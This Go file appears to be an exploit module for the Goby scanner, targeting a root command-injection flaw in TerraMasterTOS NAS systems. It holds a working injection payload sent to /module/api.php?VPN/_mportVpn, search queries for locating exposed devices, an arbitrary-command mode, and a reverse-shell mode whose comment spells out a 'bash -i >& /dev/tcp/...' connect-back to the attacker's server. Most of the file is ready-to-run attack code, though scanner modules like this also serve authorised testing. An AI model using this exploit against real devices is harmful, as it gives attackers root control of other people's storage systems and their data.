package exploits

import (
	"log"
	"net/url"
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "TerraMasterTOS module/api.php Command Execution",
    "Description": "<p>TerraMasterTOS (TerraMaster Operating System) is an operating system developed by TerraMaster to provide powerful management and service functions for its network storage products.</p><p>There is a command execution vulnerability in TerraMasterTOS. The attacker can use module/api.php? VPN/_mportVpn executes any command with root permission</p>",
    "Product": "Terramaster-system-management",
    "Homepage": "http://www.terra-master.com/",
    "DisclosureDate": "2024-03-19",
    "PostTime": "2024-03-20",
    "Author": "shitianmeng@baimaohui.net",
    "FofaQuery": "(((body=\"window.open('http://www.terra-master.com/','_blank');\"||(body=\"NAS Setup\"&&body=\"X-UA-Compatible\"&&body=\"nas.cgi\")||(title=\"TerraMaster\"&&body=\"connfailed\")||((body=\"class=\\\"cloud-logo\\\"\"||title=\"TerraMaster 系统管理\")&&body=\"class=\\\"newlogo pngFix\\\"\"))&&body!=\"Server: couchdb\")||banner=\"X-Powered-By: TerraMaster\")||body=\"nas.cgi\"",
    "GobyQuery": "(((body=\"window.open('http://www.terra-master.com/','_blank');\"||(body=\"NAS Setup\"&&body=\"X-UA-Compatible\"&&body=\"nas.cgi\")||(title=\"TerraMaster\"&&body=\"connfailed\")||((body=\"class=\\\"cloud-logo\\\"\"||title=\"TerraMaster 系统管理\")&&body=\"class=\\\"newlogo pngFix\\\"\"))&&body!=\"Server: couchdb\")||banner=\"X-Powered-By: TerraMaster\")||body=\"nas.cgi\"",
    "Level": "2",
    "Impact": "<p>There is a command execution vulnerability in TerraMasterTOS. Attackers can exploit this vulnerability through module/api.php?VPN/_mportVpn to execute arbitrary commands with root privileges, enabling them to write backdoors, gain server access, and ultimately take control of the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a patch to fix the vulnerability. Please stay updated by monitoring the following link: <a href=\"http://www.terra-master.com/\">http://www.terra-master.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux,cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        },
        {
            "name": "goby_shell_linux",
            "type": "input",
            "value": "",
            "show": "AttackType=Reversed"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/module/api.php?VPN/_mportVpn",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "status=edit&oldName=%7C%7Cid%7C%7C"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/module/api.php?VPN/_mportVpn",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/module/api.php?VPN/_mportVpn"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/module/api.php?VPN/_mportVpn",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "status=edit&oldName=%7C%7C{{{cmd}}}%7C%7C"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "Command Execution",
        "HW-2023"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "TerraMasterTOS /module/api.php 命令执行漏洞",
            "Product": "TerraMaster-系统管理",
            "Description": "<p>TerraMasterTOS（TerraMaster Operating System）是由TerraMaster开发的操作系统，旨在为其网络存储产品提供功能强大的管理和服务功能。<br></p><p>TerraMasterTOS 存在命令执行漏洞，攻击者可以通过module/api.php?VPN/_mportVpn以root权限执行任意命令<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.terra-master.com/\">http://www.terra-master.com/</a><br></p>",
            "Impact": "<p>TerraMasterTOS存在命令执行漏洞，允许攻击者通过module/api.php以根权限执行任意命令，通过VPN/_mportVpn，写入后门，获得服务器访问权限，并最终控制整个Web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "TerraMasterTOS module/api.php Command Execution",
            "Product": "Terramaster-system-management",
            "Description": "<p>TerraMasterTOS (TerraMaster Operating System) is an operating system developed by TerraMaster to provide powerful management and service functions for its network storage products.</p><p>There is a command execution vulnerability in TerraMasterTOS. The attacker can use module/api.php? VPN/_mportVpn executes any command with root permission</p>",
            "Recommendation": "<p>The vendor has released a patch to fix the vulnerability. Please stay updated by monitoring the following link: <a href=\"http://www.terra-master.com/\">http://www.terra-master.com/</a><br></p>",
            "Impact": "<p>There is a command execution vulnerability in TerraMasterTOS. Attackers can exploit this vulnerability through module/api.php?VPN/_mportVpn to execute arbitrary commands with root privileges, enabling them to write backdoors, gain server access, and ultimately take control of the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "cmd" {
				cfg := httpclient.NewPostRequestConfig("/module/api.php?VPN/_mportVpn")
				cfg.VerifyTls = false
				cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg.Data = "status=edit&oldName=%7C%7C" + url.QueryEscape(ss.Params["cmd"].(string)) + "%7C%7C"
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					expResult.Success = true
					expResult.OutputType = "html"
					expResult.Output += resp.RawBody
				}
			}
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				// 第一步，要获取到反连端口 rp
				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					// 第二步，使用拿到的反连端口 rp 生成需要执行的命令
					// ReverseTCPByBash(rp) 返回的是 bash -i >& /dev/tcp/godserver/rp
					cmd := godclient.ReverseTCPByBash(rp)
					cfg := httpclient.NewPostRequestConfig("/module/api.php?VPN/_mportVpn")
					cfg.VerifyTls = false
					cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					// 第三步，使用需要执行的命令生成 paylaod
					cfg.Data = "status=edit&oldName=%7C%7C" + url.QueryEscape(cmd) + "%7C%7C"
					go httpclient.DoHttpRequest(expResult.HostInfo, cfg)

					// 固定格式，等待目标反弹 shell，若 15 秒内没收到连接请求，认为执行失败
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			return expResult
		},
	))
}
